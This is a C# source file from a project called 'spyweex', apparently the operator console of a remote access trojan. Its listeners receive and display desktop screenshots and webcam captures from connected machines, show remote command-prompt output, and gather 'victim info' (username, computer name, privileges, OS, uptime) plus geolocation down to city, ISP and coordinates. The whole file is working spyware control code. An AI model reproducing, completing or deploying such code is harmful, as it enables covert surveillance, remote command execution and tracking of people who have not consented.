using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Runtime.Serialization.Json;
using System.Threading;
using System.Windows.Threading;
using spyweex_client_wpf.StaticStrings;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Xml.Linq;
using System.Xml.XPath;

namespace spyweex_client_wpf
{
    internal abstract class ISubscriber
    {
        public IDisposable subscriberToken;
        public bool isSubscribed = false;

        public async void UnsubscribeAsync()
        {
            await Task.Factory.StartNew(() =>
            {
                if (isSubscribed)
                {
                    isSubscribed = false;
                    subscriberToken.Dispose();
                }
            });
        }
    }

    internal class DScreenListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN)).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN))
                    {
                        using (MemoryStream byteStream = new MemoryStream(resp.content))
                        {
                            BitmapImage bi = new BitmapImage();
                            bi.BeginInit();
                            bi.CacheOption = BitmapCacheOption.OnLoad;
                            bi.StreamSource = byteStream;
                            bi.EndInit();

                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                            Guid photoID = System.Guid.NewGuid();
                            String photolocation = photoID.ToString() + ".jpg";  //file name 

                            encoder.Frames.Add(BitmapFrame.Create(bi));

                            using (var filestream = new FileStream(photolocation, FileMode.Create))
                                encoder.Save(filestream);

                            byteStream.Close();
                            Process.Start(photolocation);

                        }
                        Debug.WriteLine("Task Completed");
                        UnsubscribeAsync();
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Desktop screen subscriber " + (Exception)err);
                    UnsubscribeAsync();
                }

                );
            subscriberToken = idisp;
        }
    }

    internal class WebCamPicListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN)).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN))
                    {
                        using (MemoryStream byteStream = new MemoryStream(resp.content))
                        {
                            BitmapImage bi = new BitmapImage();
                            bi.BeginInit();
                            bi.CacheOption = BitmapCacheOption.OnLoad;
                            bi.StreamSource = byteStream;
                            bi.EndInit();

                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                            Guid photoID = System.Guid.NewGuid();
                            String photolocation = photoID.ToString() + ".jpg";  //file name 

                            encoder.Frames.Add(BitmapFrame.Create(bi));

                            using (var filestream = new FileStream(photolocation, FileMode.Create))
                                encoder.Save(filestream);

                            byteStream.Close();
                            Process.Start(photolocation);

                        }
                        Debug.WriteLine("Task Completed");
                        UnsubscribeAsync();
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Webcam screen subscriber " + (Exception)err);
                    UnsubscribeAsync();
                }

                );
            subscriberToken = idisp;
        }
    }

    internal class CmdExecListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient, ConsoleContent dc)
        {
            if(isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.COMMAND_PROMPT)).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    string result;
                    if (resp.headers.ContainsKey("Encoding"))
                    {
                        Encoding enc = Encoding.GetEncoding(Int32.Parse(resp.headers["Encoding"]));
                        result = enc.GetString(resp.content);
                    }
                    else
                    {
                        result = resp.content.ToString();
                    }

                    dc.ConsoleOutput.Add(result);
                    UnsubscribeAsync();

                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(() =>
                    //                                                    {

                    //                                                    }));
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;

        }
    }

    /// <summary>
    /// Listener to update session list (viewmodel) on new wxhtpclient received
    /// </summary>
    internal class ConnectionListener : ISubscriber
    {
        public void Subscribe(ConnectionInfoListener cil, ViewModel viewModel, WxhtpServiceServer server)
        {
            if (isSubscribed) return;
            isSubscribed = true;

            IDisposable idisp = server.getObservableSequenceOfConnections().
            ObserveOn(Scheduler.CurrentThread).
            Subscribe(
                async ipEndPointString =>
                {
                    CancellationTokenSource cts = new CancellationTokenSource();
                    CancellationToken ct;
                    ct = cts.Token;
                    WxhtpClient cl = server.TryGetClientByIpEndpoint(Utils.ParseIPEndpoint(ipEndPointString));
                    await cl.ExecuteTask(ct, 
                        cl.getTcpClient().Client.RemoteEndPoint.ToString(), 
                        METHOD_TYPE.GET, 
                        ACTION_TYPE.VICTIM_INFO);
                    cil.Subscribe(viewModel, cl);
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in SessionListener" + (Exception)err);
                }
            );

            subscriberToken = idisp;
        }
    }

    internal class ConnectionInfoListener : ISubscriber
    {
        public void Subscribe(ViewModel viewModel, WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.VICTIM_INFO)).
                Subscribe(
                response =>
                {

                    Encoding enc = Encoding.GetEncoding("utf-8");
                    string data = enc.GetString(response.content);

                    var jsonReader = JsonReaderWriterFactory.CreateJsonReader(
                        Encoding.Default.GetBytes(data), new System.Xml.XmlDictionaryReaderQuotas());
                    var root = XElement.Load(jsonReader);

                    IPEndPoint ipEndPoint = (IPEndPoint) wxhtpClient.getTcpClient().Client.RemoteEndPoint;
                    string ip = ipEndPoint.Address.ToString();
                    var tupleOfGeoData = Utils.GetGeoInfo("89.28.51.5");


                    Session s = new Session
                                {
                                    ID = (viewModel.sessions.Count + 1).ToString(),
                                    WANIP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
                                    LOCALIP = root.XPathSelectElement("//local_ip").Value,
                                    Username = root.XPathSelectElement("//username").Value,
                                    ComputerName = root.XPathSelectElement("//comp_name").Value,
                                    Privileges = root.XPathSelectElement("//privs").Value,
                                    OS = root.XPathSelectElement("//win_ver").Value,
                                    Uptime = root.XPathSelectElement("//uptime").Value,
                                    Cam = "unknown",
                                    InstallDate = "unknown",
                                    Country = tupleOfGeoData.Item1,
                                    RegionName = tupleOfGeoData.Item2,
                                    City = tupleOfGeoData.Item3,
                                    Isp = tupleOfGeoData.Item4,
                                    Coords = tupleOfGeoData.Item5,
                                    Zip = tupleOfGeoData.Item6
                    };
                    viewModel.sessions.Add(s);
                    UnsubscribeAsync();
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in ConnectionInfoListener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;
        }
    }
}
